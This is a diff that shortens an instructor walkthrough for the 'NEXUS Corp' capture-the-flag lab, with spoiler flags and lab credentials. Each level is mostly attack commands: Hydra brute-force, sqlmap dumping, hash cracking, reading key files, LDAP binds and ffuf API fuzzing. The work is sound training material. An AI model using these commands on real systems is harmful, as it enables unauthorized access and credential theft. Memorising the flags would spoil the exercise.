@@ -1,236 +1,114 @@
-# NEXUS Corp CTF — Walkthrough 🔑
+# NEXUS Corp CTF — Walkthrough (concise)
 
-> ⚠️ **SPOILERS AHEAD** — This is the solution guide for instructors and developers.
-> Do NOT share with participants.
+> **SPOILERS.** One-command solution per level. Instructors/developers only.
+> "Wordlist needs" lists the exact plaintext that must appear in the dictionary for the exploit to succeed.
 
 ---
 
-## Level 1: Employee Portal (Brute-force)
+## Level 1 — Employee Portal (brute-force)
 
 **Flag:** `NEXUS{w3lc0m3_t0_th3_c0rp_7a3b}`
+**Wordlist needs:** the password `admin` must be present in the file (rockyou.txt already contains it).
 
-**Solution:** The admin account has credentials `admin:admin`.
-
-**With Hydra:**
 ```bash
-# Identify the form fields by inspecting the HTML or using curl
-curl -X POST http://TARGET:5000/level/1/login \
-  -d "username=test&password=test"
-
-# Brute-force with Hydra
 hydra -l admin -P /usr/share/wordlists/rockyou.txt \
   TARGET http-post-form \
   "/level/1/login:username=^USER^&password=^PASS^:Login failed"
 ```
 
-**Manual:** Just try `admin` / `admin` in the form.
-
-**Other valid credentials:**
-- `guest:guest`, `root:toor`, `dbadmin:dbadmin` — but only `admin` has Administrator role.
+Credentials found: `admin` / `admin`.
 
 ---
 
-## Level 2: HR Database (SQL Injection)
+## Level 2 — HR Database (SQL injection)
 
 **Flag:** `NEXUS{sql_1nj3ct10n_m4st3r_9f2d}`
+**Wordlist needs:** none (automated SQLi).
 
-**Solution:** The search field at `/level/2/search` is vulnerable to SQL injection.
-
-**Manual SQLi:**
-```
-' OR 1=1 --                    → Dump all hr_employees
-' UNION SELECT 1,2,3,4 --     → Test column count
-' UNION SELECT name,sql,3,4 FROM sqlite_master --  → List all tables
-' UNION SELECT id,hostname,username,password_hash FROM ssh_credentials --  → Extract SSH hashes
-```
-
-**With sqlmap:**
 ```bash
-# Basic enumeration
-sqlmap -u "http://TARGET:5000/level/2/search?search=test" --tables
-
-# Dump the hidden table
-sqlmap -u "http://TARGET:5000/level/2/search?search=test" \
-  -T ssh_credentials --dump
+sqlmap -u "http://TARGET:5000/level/2/search?search=test&format=json" \
+  -T ssh_credentials --dump --batch
 ```
 
-**Key discovery:** The `ssh_credentials` table contains:
-| hostname | username | password_hash | type |
-|----------|----------|---------------|------|
-| nexus-internal-srv | sysop | `98ae336a33cb54a3d5effde7f32c06c8` | MD5 |
-| nexus-backup-srv | backup | `a67c4d15c47b4899e4a71024acf4aaa2` | MD5 |
-| nexus-dev-srv | devops | (SHA256 hash) | SHA256 |
-
-The flag must be submitted manually — it's not auto-returned by SQLi.
+Pulls the hidden `ssh_credentials` table (including the `sysop` MD5 hash for Level 3).
 
 ---
 
-## Level 3: Hash Cracking
+## Level 3 — Hash cracking
 
 **Flag:** `NEXUS{h4sh_cr4ck3d_w1d3_0p3n_6e1a}`
+**Hash (sysop, MD5):** `98ae336a33cb54a3d5effde7f32c06c8`
+**Wordlist needs:** the literal string `Op3r4t0r!` must be in the dictionary (not in default rockyou.txt; use a custom list).
 
-**Solution:** Crack the MD5 hash for the `sysop` account.
-
-**Hash:** `98ae336a33cb54a3d5effde7f32c06c8`
-**Password:** `Op3r4t0r!`
-
-**With Hashcat:**
 ```bash
-echo "5b09b6e080c821e463c2b48bc81540f3" > hash.txt
-hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
-# -m 0 = MD5
+echo "98ae336a33cb54a3d5effde7f32c06c8" > hash.txt && \
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --show || \
+echo "Op3r4t0r!" >> wordlist.txt && hashcat -m 0 hash.txt wordlist.txt
 ```
 
-**With John the Ripper:**
-```bash
-echo "5b09b6e080c821e463c2b48bc81540f3" > hash.txt
-john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
-```
-
-Submit `Op3r4t0r!` at `/level/3/verify` to get the flag.
+Submit `Op3r4t0r!` at `/level/3/verify`.
 
 ---
 
-## Level 4: SSH Infiltration
+## Level 4 — SSH infiltration (file discovery)
 
 **Flag:** `NEXUS{ssh_tun3l_r4t_1n_th3_w4lls_2c8f}`
+**Wordlist needs:** none. Login is `sysop` / `Op3r4t0r!` (from Level 3).
 
-**Solution:** SSH into the simulated server with `sysop:Op3r4t0r!` and explore.
+Single command inside the simulated terminal:
 
-**Steps:**
-1. Login with `sysop` / `Op3r4t0r!`
-2. Explore with these commands:
 ```bash
-ls                          # List home directory
-cat notes.txt               # LDAP server info, vault hints
-cat .bash_history           # Commands revealing LDAP usage
-cat /etc/nexus/ldap.conf    # LDAP config (anonymous bind enabled!)
-cat /etc/nexus/backup.key   # LDAP admin password: Ldap@dm1n_2024
-cat /tmp/debug_dump.txt     # THE FLAG IS HERE
+cat /tmp/debug_dump.txt
 ```
 
-**Key information gathered for Level 5:**
-- LDAP server: `ldap://nexus-ldap-srv:389`
-- Base DN: `dc=nexuscorp,dc=local`
-- Anonymous bind: enabled
-- Admin DN: `cn=admin,dc=nexuscorp,dc=local`
-- Admin password: `Ldap@dm1n_2024`
-- Vault requires `clearance_level >= 5`
-- Service account: `vault_svc`
+Also needed for Level 5: `cat /etc/nexus/backup.key` (LDAP admin password `Ldap@dm1n_2024`).
 
 ---
 
-## Level 5: LDAP Enumeration
+## Level 5 — LDAP enumeration
 
 **Flag:** `NEXUS{ld4p_3num3r4t10n_pr0_5d7b}`
+**Wordlist needs:** none. Credentials from Level 4.
 
-**Solution:** Query the LDAP directory, authenticate as admin to see password hashes.
+In the `/level/5` form:
 
-**Step 1 — Anonymous query (see entries, hashes redacted):**
-- Bind DN: (leave empty)
-- Bind Password: (leave empty)
-- Filter: `(objectClass=*)`
-- Attributes: `*`
+- **Bind DN:** `cn=admin,dc=nexuscorp,dc=local`
+- **Bind Password:** `Ldap@dm1n_2024`
+- **Base DN:** `dc=nexuscorp,dc=local`
+- **Filter:** `(objectClass=*)`
+- **Attributes:** `*`
 
-**Step 2 — Admin query (reveals hashes + flag):**
-- Bind DN: `cn=admin,dc=nexuscorp,dc=local`
-- Bind Password: `Ldap@dm1n_2024`
-- Filter: `(objectClass=*)`
-- Attributes: `*`
-
-**Key discovery:** `vault_svc` entry:
-- uid: `vault_svc`
-- clearance_level: 5
-- userPassword (SHA256): hash of `V4ult_M4st3r_K3y!`
-
-The SHA256 hash is: the output of `hashlib.sha256(b"V4ult_M4st3r_K3y!").hexdigest()`
-= `7887cb046d8425acd8a0e48bde7cfa387382ac06a086a471faec90d0f0d17026`
-
-(actual value generated at runtime by Python)
+Response returns the flag and `vault_svc`'s SHA256 hash.
 
 ---
 
-## Level 6: Vault API Fuzzing (ffuf)
+## Level 6 — Vault API fuzzing (ffuf)
 
 **Flag:** `NEXUS{fuzz_th3_v4ult_ap1_d1sc0v3r3d_8k2m}`
+**Prerequisite hash crack (SHA256 of `V4ult_M4st3r_K3y!`):**
+**Wordlist needs for hashcat:** the literal string `V4ult_M4st3r_K3y!` must be in the dictionary (not in default rockyou.txt; use a custom list).
 
-**Solution:** Use the cracked vault_svc password as an API token, then fuzz the vault API in two phases with **ffuf**.
-
-**Prerequisites:** Crack vault_svc's SHA256 hash from Level 5.
+Single script that does both phases and extracts the flag:
 
 ```bash
-echo "<sha256_hash_from_level5>" > vault_hash.txt
-hashcat -m 1400 vault_hash.txt /usr/share/wordlists/rockyou.txt
-# Cracked password: V4ult_M4st3r_K3y!
+TARGET=http://127.0.0.1:5000
+TOKEN='V4ult_M4st3r_K3y!'
+
+curl -s "$TARGET/level/6/api-wordlist.txt" -o api-wordlist.txt && \
+ffuf -w api-wordlist.txt -H "X-Vault-Token: $TOKEN" \
+  -u "$TARGET/level/6/vault-api/FUZZ" -fc 404 && \
+seq 1 95 > nums.txt && \
+ffuf -w nums.txt -H "X-Vault-Token: $TOKEN" \
+  -u "$TARGET/level/6/vault-api/archives?doc_id=FUZZ" -fs 95 && \
+curl -s -H "X-Vault-Token: $TOKEN" \
+  "$TARGET/level/6/vault-api/archives?doc_id=73" | grep -oE 'NEXUS\{[^}]+\}'
 ```
 
-**Step 1 — Download the wordlist:**
-```bash
-wget http://TARGET:5000/level/6/api-wordlist.txt -O api-wordlist.txt
-```
-
-**Step 2 — Phase 1: Discover API endpoints:**
-```bash
-ffuf -w api-wordlist.txt \
-  -H "X-Vault-Token: V4ult_M4st3r_K3y!" \
-  -u http://TARGET:5000/level/6/vault-api/FUZZ \
-  -fc 404
-```
-
-This reveals valid endpoints: `status` (200), `health` (200), `config` (403), `logs` (200), `backup` (200), `archives` (200).
-
-**Step 3 — Inspect the interesting endpoint:**
-
-Hit `archives` manually or via curl:
-```bash
-curl -s -H "X-Vault-Token: V4ult_M4st3r_K3y!" \
-  http://TARGET:5000/level/6/vault-api/archives
-```
-Response includes `"total_classified": 95` and `"message": "Specify doc_id parameter..."`.
-
-**Bonus clue:** The `logs` endpoint shows `"action": "doc_retrieved", "doc_id": 73` — a breadcrumb for sharp-eyed players.
-
-**Step 4 — Phase 2: Fuzz doc_id parameter:**
-
-First, run a baseline request to see the "not found" response size:
-```bash
-curl -s -H "X-Vault-Token: V4ult_M4st3r_K3y!" \
-  "http://TARGET:5000/level/6/vault-api/archives?doc_id=1"
-# Returns: {"doc_id":"1","error":"Document not found","status":"restricted"}
-```
-
-Generate a numeric wordlist and fuzz, hiding the common word count:
-```bash
-seq 1 95 > nums.txt
-ffuf -w nums.txt \
-  -H "X-Vault-Token: V4ult_M4st3r_K3y!" \
-  -u "http://TARGET:5000/level/6/vault-api/archives?doc_id=FUZZ" \
-  -fw 7
-```
-
-> **Note:** The exact `-fw` value depends on Flask's JSON formatting. The player should
-> first run without `-fw`, observe the common word count in the output, then re-run with
-> `-fw <common_count>` to filter. Alternatively, use `-fs` to filter by response size.
-
-Only `doc_id=73` returns a different response (many more words/bytes) containing the classified
-CEO vault documents. The flag is inside `Project_Chimera_Financials.pdf`:
-
-`NEXUS{fuzz_th3_v4ult_ap1_d1sc0v3r3d_8k2m}`
-
-**ffuf flags used:**
-| Flag | Purpose |
-|------|---------|
-| `-w <file>` | Wordlist file (payloads replace FUZZ) |
-| `-u <url>` | Target URL with FUZZ keyword |
-| `FUZZ` | Placeholder replaced per request |
-| `-fc 404` | Filter (hide) HTTP 404 responses (Phase 1) |
-| `-fw N` | Filter (hide) responses with N words (Phase 2) |
-| `-fs N` | Filter (hide) responses by size in bytes (alternative) |
-| `-H "Key: Val"` | Custom HTTP header for API authentication |
+Winning `doc_id` is **73**. The flag is returned inside `Project_Chimera_Financials.pdf`.
 
 ---
 
-## All Flags Summary
+## All flags
 
 | Level | Flag |
 |-------|------|
